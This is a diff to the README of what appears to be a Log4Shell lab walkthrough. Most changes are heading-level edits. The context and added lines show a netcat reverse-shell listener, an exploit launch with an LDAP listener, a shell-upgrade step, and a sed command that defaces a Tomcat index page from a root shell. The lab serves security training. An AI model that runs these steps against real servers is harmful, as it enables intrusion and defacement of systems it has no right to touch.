@@ -61,7 +61,7 @@ http://localhost:8080/
 
 ### Extended walkthrough
 
-### Terminal 1: netcat listener
+#### Terminal 1: netcat listener
 
 ```bash
 ┌──(kauser㉿kalilab)-[~]
@@ -69,7 +69,7 @@ http://localhost:8080/
 listening on [any] 9001 ...
 ```
 
-### Terminal 2: Launch exploit
+#### Terminal 2: Launch exploit
 
 ```bash
 ┌──(kauser㉿kalilab)-[/log4jlab]
@@ -94,7 +94,7 @@ jdk1.8.0_20    README.md
 Listening on 0.0.0.0:1389
 ```
 
-### Terminal 3: create vulnerable application
+#### Terminal 3: create vulnerable application
 
 ```bash
 ┌──(kauser㉿kalilab)-[/log4jlab]
@@ -210,5 +210,7 @@ root@kalilab:/usr/local/tomcat# ^Z
 └─$ stty raw -echo; fg; reset
 nc -lvnp 9001
 
-root@kalilab:/usr/local/tomcat# 
+root@kalilab:/usr/local/tomcat# sed -i 's/Hello Again!/<<< LOG4SHELL PoC >>>/g' webapps/ROOT/index.jsp
+
+# Refresh browser ;-)
 ```
